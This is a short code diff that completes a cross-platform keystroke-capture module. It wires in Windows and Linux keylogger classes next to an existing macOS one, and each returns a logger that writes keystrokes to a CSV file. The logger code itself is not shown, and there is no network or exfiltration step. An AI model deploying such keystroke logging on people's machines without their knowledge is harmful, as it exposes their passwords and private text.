@@ -1,7 +1,7 @@
 from core.key_capture.darwin_key_logger import DarwinKeyLogger
+from core.key_capture.linux_key_logger import LinuxKeyLogger
+from core.key_capture.windows_key_logger import WindowsKeyLogger
 
-
-# Import other OS-specific keyloggers when implemented
 
 class KeyCaptureModule:
     """
@@ -27,13 +27,14 @@ class KeyCaptureModule:
         :return: An instance of a keylogger.
         """
         if os_type == "Windows":
-            # Return an instance of WindowsKeyLogger when implemented
-            pass
+            # Return an instance of WindowsKeyLogger
+            return WindowsKeyLogger("keystrokes.csv")  # File path for logging
         elif os_type == "Darwin":
             return DarwinKeyLogger("keystrokes.csv")  # Provide the file path for logging
         elif os_type == "Linux":
-            # Return an instance of LinuxKeyLogger when implemented
-            pass
+            # Return an instance of LinuxKeyLogger
+            return LinuxKeyLogger("keystrokes.csv")  # File path for logging
+
         else:
             raise ValueError(f"Unsupported OS: {os_type}")
 
